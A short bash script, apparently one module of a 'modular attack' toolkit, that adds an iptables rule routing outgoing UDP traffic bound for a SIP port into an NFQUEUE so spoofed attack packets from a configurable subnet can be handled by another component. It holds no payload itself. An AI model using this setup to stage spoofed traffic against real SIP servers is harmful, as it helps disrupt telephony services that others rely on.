#!/bin/bash
# Modular attack iptables setup

ATTACK_QUEUE_NUM=${1:-1}
SIP_PORT=${2:-5060}
SPOOFED_SUBNET=${3:-"10.10.123.0/25"}

echo "[+] Setting up attack iptables rules"
echo "    - Attack Queue: $ATTACK_QUEUE_NUM"
echo "    - SIP Port: $SIP_PORT"
echo "    - Spoofed Subnet: $SPOOFED_SUBNET"

# Match outgoing spoofed attack traffic → destined to SIP port
sudo iptables -I OUTPUT -p udp --dport "$SIP_PORT" -j NFQUEUE --queue-num "$ATTACK_QUEUE_NUM"

if [ $? -eq 0 ]; then
    echo "[+] Attack iptables rules applied successfully"
    exit 0
else
    echo "[!] Failed to apply attack iptables rules"
    exit 1
fi
